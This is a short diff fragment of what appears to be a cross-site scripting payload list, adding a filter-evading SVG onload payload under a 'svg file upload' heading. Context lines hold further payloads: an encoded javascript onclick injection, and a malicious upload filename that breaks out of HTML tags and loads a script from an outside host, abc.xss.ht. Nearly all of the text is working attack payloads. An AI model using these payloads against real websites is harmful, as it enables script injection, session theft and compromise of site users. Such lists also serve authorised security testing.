@@ -100,6 +100,8 @@ batman"></form><div%20class="inner%20product-tab"><h3><jAvAsCrIpT:%20onclick=loc
 
 "filename":"synack'\"><title></textarea></script></style></noscript><script src=https://abc.xss.ht></script>.jpg"
 
+<svg/On/OnLoAd=confirm(1)>
+
 ```
 
 svg file upload
